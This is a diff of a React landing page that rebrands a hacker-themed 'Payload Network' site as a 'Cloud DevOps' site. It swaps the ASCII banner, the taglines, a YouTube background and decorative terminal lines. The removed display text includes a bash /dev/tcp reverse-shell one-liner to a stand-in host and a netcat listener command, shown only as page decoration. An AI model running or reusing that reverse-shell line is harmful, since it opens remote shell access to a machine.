@@ -1,31 +1,13 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState } from "react";
 
 export default function Home() {
-  const [bgImage, setBgImage] = useState("");
   const [popup, setPopup] = useState<{ show: boolean; message: string; title: string }>({
     show: false,
     message: "",
     title: ""
   });
-
-  const updateBackground = () => {
-    const imageIndex = Math.floor(Math.random() * 5) + 1;
-    setBgImage(`/img/${imageIndex}.jpg`);
-  };
-
-  // Generate random background image and change every 30 seconds
-  useEffect(() => {
-    // Set initial background
-    updateBackground();
-
-    // Change background every 15 seconds
-    const interval = setInterval(updateBackground, 30000);
-
-    // Cleanup interval on unmount
-    return () => clearInterval(interval);
-  }, []);
 
   const handleButtonClick = (buttonType: string) => {
     const messages = {
@@ -51,16 +33,11 @@ export default function Home() {
     <div className="relative flex min-h-screen items-center justify-center overflow-hidden">
       {/* YouTube Video Background */}
       <div className="absolute inset-0 z-0">
-        {/* <iframe
+        <iframe
           className="absolute top-1/2 left-1/2 w-[100vw] h-[100vh] min-w-[177.77vh] min-h-[56.25vw] -translate-x-1/2 -translate-y-1/2"
-          src="https://www.youtube.com/embed/buSGKekgXl8?autoplay=1&mute=1&loop=1&playlist=buSGKekgXl8&controls=0&showinfo=0&rel=0&modestbranding=1"
+          src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&controls=0&showinfo=0&rel=0&modestbranding=1"
           allow="autoplay; encrypted-media"
           allowFullScreen
-        /> */}
-        <div
-          key={bgImage}
-          className="absolute inset-0 bg-cover bg-center animate-bgZoom"
-          style={{ backgroundImage: `url(${bgImage})` }}
         />
         {/* Dark overlay */}
         <div className="absolute inset-0 bg-black/70" />
@@ -86,7 +63,7 @@ export default function Home() {
               />
             </div>
             <div className="flex-1 text-center text-[10px] sm:text-xs lg:text-sm font-medium text-white/90 overflow-hidden text-ellipsis whitespace-nowrap">
-              {`$ bash -i >& /dev/tcp/hackerz.local/8080 0>&1`}
+              {`$ kubectl apply -f deployment.yaml --namespace=production`}
             </div>
             <div className="w-[30px] sm:w-[52px]" /> {/* Spacer for centering */}
           </div>
@@ -96,38 +73,38 @@ export default function Home() {
             <div className="flex flex-col items-center gap-4 sm:gap-6 lg:gap-8 text-center">
               <pre className="text-white text-[8px] xs:text-[10px] sm:text-xs md:text-sm leading-tight drop-shadow-lg overflow-x-auto max-w-full">
                 {`
-██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
-██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
-██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
-██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
-██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
-╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
-
-███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
-████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
-██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
-██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
-██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
-╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
+ ██████╗██╗      ██████╗ ██╗   ██╗██████╗ 
+██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗
+██║     ██║     ██║   ██║██║   ██║██║  ██║
+██║     ██║     ██║   ██║██║   ██║██║  ██║
+╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝
+ ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
+                                           
+██████╗ ███████╗██╗   ██╗ ██████╗ ██████╗ ███████╗
+██╔══██╗██╔════╝██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝
+██║  ██║█████╗  ██║   ██║██║   ██║██████╔╝   ██║   
+██║  ██║██╔══╝  ╚██╗ ██╔╝██║   ██║██╔═══╝    ██║   
+██████╔╝███████╗ ╚████╔╝ ╚██████╔╝██║        ██║   
+╚═════╝ ╚══════╝  ╚═══╝   ╚═════╝ ╚═╝        ╚═╝   
 `}
               </pre>
               <p className="text-white/80 font-mono text-xs sm:text-sm -mt-2 sm:-mt-4 px-2">
-                We break stuff so hackers can't
-              </p>
-              <p className="text-base sm:text-xl lg:text-2xl font-thin italic text-white/60 tracking-wider sm:tracking-widest mt-3 sm:mt-6 px-2 glitch" data-text="— No thought is a crime —">
-                — No thought is a crime —
+                Infrastructure as Code | CI/CD Automation | Cloud Architecture
               </p>
               <div className="w-full max-w-lg mt-4 sm:mt-6 lg:mt-8 font-mono px-2">
                 <div className="text-left space-y-1.5 sm:space-y-2 text-green-400 text-xs sm:text-sm overflow-x-auto">
-                  <p className="text-green-500/70">// CONNECT WITH US</p>
+                  <p className="text-green-500/70">// SYSTEM STATUS</p>
                   <p className="text-white/90">
-                    <span className="text-green-400">$</span> echo <span className="text-yellow-300">"info@payload.network"</span> | mail
+                    <span className="text-green-400">$</span> kubectl get pods --all-namespaces | grep <span className="text-yellow-300">Running</span>
                   </p>
                   <p className="text-white/90">
-                    <span className="text-green-400">$</span> curl <span className="text-yellow-300">https://payload.network</span>
+                    <span className="text-green-400">$</span> terraform apply <span className="text-green-500/70">-auto-approve</span>
                   </p>
                   <p className="text-white/90 break-all sm:break-normal">
-                    <span className="text-green-400">$</span> nc -lvp <span className="text-yellow-300">1337</span> <span className="text-green-500/70 hidden sm:inline"># waiting for your message...</span>
+                    <span className="text-green-400">$</span> aws cloudformation deploy <span className="text-yellow-300">--stack-name prod-infra</span>
+                  </p>
+                  <p className="text-green-500/90">
+                    <span className="text-green-400">$</span> <span className="text-green-500/70"># Uptime: 99.99% | Deployments: 847 | Zero downtime</span>
                   </p>
                   <p className="text-green-400 animate-pulse">█</p>
                 </div>
